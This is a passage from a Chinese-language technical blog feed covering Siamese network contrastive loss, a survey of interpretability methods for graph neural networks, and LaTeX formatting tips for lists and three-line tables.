style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8746639999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>W</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>X</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>X</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mi>i</mi></msup><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>Y</mi><mo stretchy="false">)</mo><msub><mi>L</mi><mi>G</mi></msub><mrow><mo fence="true">(</mo><msub><mi>E</mi><mi>W</mi></msub><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>X</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mi>i</mi></msup><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mrow></mrow><mrow><mo>+</mo><mi>Y</mi><msub><mi>L</mi><mi>I</mi></msub><mrow><mo fence="true">(</mo><msub><mi>E</mi><mi>W</mi></msub><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>X</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mi>i</mi></msup><mo fence="true">)</mo></mrow></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array} {c}{ {L(W,(X_{1},X_{1},X_{2})^{i})=(1-Y)L_{G}\left(E_{W}(X_{1},X_{2})^{i}\right)} }\\ { { } } { {+ {Y}L_{I}\left(E_{W}(X_{1},{ { {X} } }_{2})^{i}\right)} }\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.42em;vertical-align:-0.96em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.46em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">G</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></span><span style="top:-2.4em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"></span></span><span class="mord"><span class="mord"><span class="mord">+</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.96em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p>根据我们对两个向量间举例的定义，可以得到以下条件：<br>即不同类别向量间的距离比相同类别向量间距离大。<br>两个向量之间距离越小，属于同一类别的可能性就越大。</p><h4 id="目前的contrastive-loss">目前的Contrastive Loss</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191528403.png" alt="img"></p><p>其中：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191528406.png" alt="img"></p><p>代表两个样本特征X1和X2 的欧氏距离（二范数）P 表示样本的特征维数，Y 为两个样本是否匹配的标签，Y=1 代表两个样本相似或者匹配，Y=0 则代表不匹配，m 为设定的阈值，N 为样本个数。</p><p>观察上述的contrastive loss的表达式可以发现，这种损失函数可以很好</p><p>的表达成对样本的匹配程度，也能够很好用于训练提取特征的模型。</p><p>当 Y=1（即样本相似时），损失函数只剩下</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191528402.png" alt="在这里插入图片描述"></p><p>当 Y=0 (即样本不相似时），损失函数为</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191528405.png" alt="在这里插入图片描述"></p><p>即当样本不相似时，其特征空间的欧式距离反而小的话，损失值会变大，这也正好符号我们的要求。<br><strong>注意：</strong><br>这里设置了一个阈值<strong>ｍargin</strong>，表示我们只考虑不相似特征欧式距离在<strong>０～ｍargin</strong>之间的，当距离超过ｍargin的，则把其loss看做为０**(即不相似的特征离的很远，其loss应该是很低的；而对于相似的特征反而离的很远，我们就需要增加其loss，从而不断更新成对样本的匹配程度)**</p><h2 id="siamese的思想总结">Siamese的思想总结</h2><p>其实讲了这么多，主要思想就是三点：</p><ul><li>输入不再是单个样本，而是一对样本，不再给单个的样本确切的标签，而且给定一对样本是否来自同一个类的标签，是就是0，不是就是1</li><li>设计了两个一模一样的网络，网络共享权值W，对输出进行了距离度量，可以说l1、l2等。</li><li>针对输入的样本对是否来自同一个类别设计了损失函数，损失函数形式有点类似交叉熵损失：<img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191528415.png" alt=""></li></ul><p>最后使用获得的损失函数，使用反向传播梯度下降去更新两个网络共享的权值W。</p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DL知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可解释机器学习</title>
      <link href="/2023/12/16/AILearning/DL/%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/12/16/AILearning/DL/%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="可解释机器学习">可解释机器学习</h1><p>作者：SkylaSun</p><p>链接：<a href="https://zhuanlan.zhihu.com/p/570926717">https://zhuanlan.zhihu.com/p/570926717</a></p><p>来源：知乎</p><p>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><h2 id="可解释机器学习-2">可解释机器学习</h2><p>可解释性方法将机器学习模型的决策过程转变成人类更能理解的结果。通用可解释性方法一般仅基于特征进行解释，无法处理图结构信息，在处理漏洞发掘场景下的图数据时，作者将边的相关性分数传递到<a href="https://www.zhihu.com/search?q=%E9%82%BB%E6%8E%A5%E8%8A%82%E7%82%B9&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">邻接节点</a>中，从而产生一个节点级别的解释。</p><ul><li>CAM（<a href="https://www.zhihu.com/search?q=%E7%B1%BB%E5%88%AB%E6%BF%80%E6%B4%BB%E6%98%A0%E5%B0%84%E5%9B%BE&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">类别激活映射图</a>），一种特征<a href="https://www.zhihu.com/search?q=%E5%8F%AF%E8%A7%86%E5%8C%96%E6%8A%80%E6%9C%AF&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">可视化技术</a>，最初为解释CNN模型而设计，将深层网络中学习到的<a href="https://www.zhihu.com/search?q=%E8%AF%AD%E4%B9%89%E4%BF%A1%E6%81%AF&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">语义信息</a>，通过权重与输出节点联系起来。</li><li><a href="https://www.zhihu.com/search?q=%E7%BA%BF%E6%80%A7%E8%BF%91%E4%BC%BC&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">线性近似</a>，通过梯度与输入，计算每个特征对分类输出的线性化贡献。</li><li>GradCAM，将<a href="https://www.zhihu.com/search?q=%E7%BA%BF%E6%80%A7%E8%BF%91%E4%BC%BC%E6%96%B9%E6%B3%95&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">线性近似方法</a>应用于GNN层的中间<a href="https://www.zhihu.com/search?q=%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">激活函数</a>，而非输入激活，产生了类似CAM的优势。</li><li>SmoothGrad，对多个噪声输入进行节点特征梯度平均，并且产生了抗噪声的解释。</li><li>IG（<a href="https://www.zhihu.com/search?q=%E7%A7%AF%E5%88%86%E6%A2%AF%E5%BA%A6&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">积分梯度</a>），改进了线性近似，过程中参考了反事实基线输入G‘，并且使用延实际输入G的<a href="https://www.zhihu.com/search?q=%E7%9B%B4%E7%BA%BF&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">直线</a>路径平均的梯度，以及G和G’之间的输入激活。</li><li>Gradient or Saliency Method，通过梯度衡量预测结果相对不同输入的变化情况。</li><li>GB（导向反向传播），对普通的<a href="https://www.zhihu.com/search?q=%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">反向传播</a>加了指导，限制了小于0的梯度的回传。</li><li>LRP（逐层相关性传播），将预测结果反向传递会输入，创建相关性映射。</li><li>EB（<a href="https://www.zhihu.com/search?q=%E6%BF%80%E5%8A%B1%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">激励反向传播</a>），使用反向传播计算l-1层到第1层中<a href="https://www.zhihu.com/search?q=%E7%A5%9E%E7%BB%8F%E5%85%83&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">神经元</a>激活的相对影响，而且仅考虑<a href="https://www.zhihu.com/search?q=%E6%AD%A3%E6%9D%83%E9%87%8D&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">正权重</a>。</li></ul><p>另外，本文关注的三种针对<a href="https://www.zhihu.com/search?q=GNN%E6%A8%A1%E5%9E%8B&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">GNN模型</a>的可解释性方法概述如下：</p><p><strong>GNNExplainer</strong>，<a href="https://www.zhihu.com/search?q=%E9%BB%91%E7%9B%92%E5%89%8D%E5%90%91%E8%A7%A3%E9%87%8A%E6%8A%80%E6%9C%AF&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">黑盒前向解释技术</a>，最大化整体预测结果和可判别子图S以及节点特征子集的<a href="https://www.zhihu.com/search?q=%E4%BA%92%E4%BF%A1%E6%81%AF&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">互信息</a>。</p><p><strong>PGExplainer</strong>，解决了GNNExplainer需要针对每个单独的图实例进行计算的问题，同样也是通过提取相关子图S进行全局解释，但支持归纳式学习方法。</p><p><strong>Graph-LRP</strong>使用<a href="https://www.zhihu.com/search?q=%E9%AB%98%E9%98%B6%E6%B3%B0%E5%8B%92%E5%B1%95%E5%BC%80&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%22570926717%22%7D">高阶泰勒展开</a>处理多层GNN上节点之间的消息传递。</p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DL知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>overleaf 葵花宝典</title>
      <link href="/2023/12/16/Manuscripts/overleaf/overleaf%E7%BB%8F%E9%AA%8C/"/>
      <url>/2023/12/16/Manuscripts/overleaf/overleaf%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="1列表">1.列表</h1><h2 id="itemize命令无序列表"><strong>{itemize}命令【无序列表】</strong></h2><blockquote><p>{itemize}命令对文本进行简单的排列，不是采用序号，默认是用实心圆点符号进行排列。这个命令需要和\item配合使用。</p></blockquote><p>默认为实心圆点符号</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;itemize&#125;</span><br><span class="line">    <span class="keyword">\item</span> one</span><br><span class="line">    <span class="keyword">\item</span> two</span><br><span class="line">    <span class="keyword">\item</span> ...</span><br><span class="line"><span class="keyword">\end</span>&#123;itemize&#125;</span><br></pre></td></tr></table></figure><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191508804.png" alt="image-20231210154216456"></p><p>使用其他符号进行排列</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;itemize&#125;</span><br><span class="line">    <span class="keyword">\item</span>[*] one</span><br><span class="line">    <span class="keyword">\item</span>[*] two</span><br><span class="line">    <span class="keyword">\item</span>[*] ...</span><br><span class="line"><span class="keyword">\end</span>&#123;itemize&#125;</span><br></pre></td></tr></table></figure><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191508806.png" alt="image-20231210155010036"></p><h2 id="enumerate命令有序列表"><strong>{enumerate}命令【有序列表】</strong></h2><blockquote><p>{enumerate}命令采用序号对文本进行简单的排列，默认是用1，2，3进行排列。这个命令需要和\item配合使用。</p></blockquote><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;enumerate&#125;</span><br><span class="line">    <span class="keyword">\item</span> one</span><br><span class="line">    <span class="keyword">\item</span> two</span><br><span class="line">    <span class="keyword">\item</span> ...</span><br><span class="line"><span class="keyword">\end</span>&#123;enumerate&#125;</span><br></pre></td></tr></table></figure><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191508812.png" alt="image-20231210155244000"></p><p><strong>使用其他形式的编号</strong>：</p><blockquote><p>{enumerate}产生所需要的编号，默认是采用数字1,2,3……进行排列。</p><p><strong>使用命令\usepackage{enumerate}</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">\begin&#123;enumerate&#125;[i)]</span><br><span class="line">    \item one</span><br><span class="line">    \item two</span><br><span class="line">    \item ...</span><br><span class="line">\end&#123;enumerate&#125;</span><br><span class="line"></span><br><span class="line">\begin&#123;enumerate&#125;[1)]</span><br><span class="line">    \item one</span><br><span class="line">    \item two</span><br><span class="line">    \item ...</span><br><span class="line">\end&#123;enumerate&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 自定义编号形式</span><br><span class="line"></span><br><span class="line">\begin&#123;description&#125;</span><br><span class="line">    \item[Step1] one</span><br><span class="line">    \item[Step2] two</span><br><span class="line">    \item[Step3] ...</span><br><span class="line">\end&#123;description&#125;</span><br></pre></td></tr></table></figure><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191509540.png" alt="image-20231219150916511"></p><h1 id="2三线表">2.三线表</h1><p>使用方法1或者2都可以，两种latex编辑器WinEdt和TexStudio各有优点，看你选择，我用的是方法1，使用WinEdt。</p><p>直接显示latex 代码，然后你们根据自己的情况进行修改即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">\begin&#123;table&#125;[h] %h表示三线表在当前位置插入</span><br><span class="line">\setlength&#123;\abovecaptionskip&#125;&#123;<span class="number">0.</span>05cm&#125; %设置三线表标题与第一条线间距</span><br><span class="line">\centering</span><br><span class="line">\caption&#123;\textbf&#123;The characteristics of various methods&#125;&#125;</span><br><span class="line">%表头文本加黑，但不加黑Table <span class="number">1.</span>字样，引入包即可：\usepackage[labelfont=bf]&#123;caption&#125;</span><br><span class="line">\arrayrulecolor&#123;black&#125; %设置三线表线条颜色：黑色</span><br><span class="line">\begin&#123;tabular*&#125;&#123;\hsize&#125;&#123;@&#123;\extracolsep&#123;\fill&#125;&#125;c c c c&#125; %&#123;\hsize&#125;使三线表自适应宽度，c表示文本居中</span><br><span class="line">  \hline</span><br><span class="line">  <span class="number">1</span> &amp; <span class="number">2</span> &amp; <span class="number">3</span> &amp; <span class="number">4</span>\\</span><br><span class="line">  \hline</span><br><span class="line">  <span class="number">11</span> &amp; <span class="number">22</span> &amp; <span class="number">33</span> &amp; <span class="number">44</span> \\</span><br><span class="line">  <span class="number">111</span> &amp; <span class="number">222</span> &amp; <span class="number">333</span> &amp; <span class="number">444</span> \\</span><br><span class="line">  <span class="number">1111</span> &amp; <span class="number">2222</span> &amp; <span class="number">3333</span> &amp; <span class="number">4444</span> \\</span><br><span class="line">  <span class="number">11111</span> &amp; <span class="number">22222</span> &amp; <span class="number">33333</span> &amp; <span class="number">44444</span> \\</span><br><span class="line">  <span class="number">111111</span> &amp; <span class="number">222222</span> &amp; <span class="number">333333</span> &amp; <span class="number">444444</span> \\</span><br><span class="line">  \hline</span><br><span class="line">\end&#123;tabular*&#125;</span><br><span class="line">\end&#123;table&#125;</span><br></pre></td></tr></table></figure><p>添加包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\usepackage&#123;booktabs&#125;</span><br><span class="line">\usepackage&#123;amsmath&#125;</span><br><span class="line">\usepackage&#123;setspace&#125;</span><br><span class="line">\usepackage&#123;array,caption&#125;</span><br><span class="line">\usepackage[labelfont=bf]&#123;caption&#125;</span><br></pre></td></tr></table></figure><h1 id="3图片过大处理">3.图片过大处理</h1><p>在<a href="https://so.csdn.net/so/search?q=LaTeX%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87&amp;spm=1001.2101.3001.7020">LaTeX插入图片</a>的时候，经常需要调整图片的大小。我们可以通过如下代码来完成：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 